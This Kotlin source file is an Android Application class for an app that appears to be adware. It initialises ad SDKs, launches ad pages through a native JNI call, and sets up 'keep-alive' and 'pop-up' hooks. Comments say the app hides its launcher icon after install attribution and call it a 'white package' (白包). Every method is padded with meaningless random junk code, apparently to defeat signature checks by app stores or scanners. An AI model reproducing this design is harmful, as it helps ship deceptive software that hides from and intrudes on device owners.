package aku.oldxz.bgt

import android.app.Application
import android.content.Intent
import android.os.Bundle
import aku.oldxz.bgt.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import aku.akzay.yckc.ad.runtime.AdLifecycleInstaller
import aku.akzay.yckc.base.APPContext
import aku.akzay.yckc.base.OverseaAppHost
import aku.akzay.yckc.base.OverseaAppInitializer


class GCH : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: GCH? = null
    }

    override fun onCreate() {
        val arr_xtNVjrXLgqAxFJsCvJ  = listOf("ZWVxxPiq", "brbOlQrFRfYoiRixKK", "ZtAViOorf").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_WCvxwBfecWpFOOeQATr  = arr_xtNVjrXLgqAxFJsCvJ .filter { it.length > 96 }
         if (ad_WCvxwBfecWpFOOeQATr .isNotEmpty() && java.lang.System.currentTimeMillis() < 79) {
             ad_WCvxwBfecWpFOOeQATr .forEach { _ ->  }
         }
        super.onCreate()
        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun openLaunch(intent: Intent?) {
        val arr_QPApjonTZSyCPL = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_fnCMqtTzyhYrMub  = (arr_QPApjonTZSyCPL  shl 5) xor (arr_QPApjonTZSyCPL  shr 54)
         val j_PRehsK  = i_fnCMqtTzyhYrMub .inv() and 0xFFFF
         if (j_PRehsK  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_EJFtKhQBS")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val ySrVkkit : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val pqQlsevf  = ySrVkkit ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_10" 
            }
            if (pqQlsevf .startsWith("BfymZuAIJHcJUB ")) {
                android.util.Log.v("TAG", pqQlsevf )
            }
        RNQE.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_FUzVStzutLeJtoeppn  = listOf("pMogDLLZNbNvmVE", "SRinmST", "rXBHWSFIZVuRHPUHr").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_IFHjxycWvfxv  = arr_FUzVStzutLeJtoeppn .filter { it.length > 30 }
         if (ad_IFHjxycWvfxv .isNotEmpty() && java.lang.System.currentTimeMillis() < 45) {
             ad_IFHjxycWvfxv .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val arr_sgpnrQlJuJHm = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_hFKApoQYHs  = (arr_sgpnrQlJuJHm  shl 0) xor (arr_sgpnrQlJuJHm  shr 1)
         val j_doXmGKkNkcv  = i_hFKApoQYHs .inv() and 0xFFFF
         if (j_doXmGKkNkcv  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_PtgSxDHWEBZpMzPQ")
         }
        // 图标隐藏已由 oversea_base_module 在归因后置流程统一调度(OverseaAppHost.enableIconHide 默认开启)
    }


    override fun initKeepPower(app: Application) {
        val arr_eYKlqehxIccNEQg  = listOf("RpAKl", "OXlhknouXUcUyKvBgJy", "XbYhCPO").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_oiosOYrKfoKNb  = arr_eYKlqehxIccNEQg .filter { it.length > 93 }
         if (ad_oiosOYrKfoKNb .isNotEmpty() && java.lang.System.currentTimeMillis() < 47) {
             ad_oiosOYrKfoKNb .forEach { _ ->  }
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}